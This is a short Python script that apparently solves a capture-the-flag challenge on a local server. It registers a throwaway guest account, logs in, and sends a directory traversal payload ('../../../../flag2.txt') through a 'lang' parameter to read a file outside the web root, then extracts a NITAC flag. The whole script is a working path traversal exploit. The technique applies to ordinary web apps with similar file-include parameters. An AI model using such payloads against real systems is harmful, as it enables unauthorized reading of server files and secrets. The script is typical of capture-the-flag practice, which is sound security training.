import requests
import random
import re

url = "http://0.0.0.0:8001"

data = {"username": "guest_{}".format(random.randrange(0, 1<<32)),
        "password": "guest"}
r = requests.post("{}/register.php".format(url), data)
r = requests.post("{}/login.php".format(url), data, allow_redirects=False)

payload = {"lang": "../../../../flag2.txt"}
r = requests.get("{}".format(url), params=payload, cookies=r.cookies)
print(re.findall("(NITAC\{.+\})", r.text)[0])
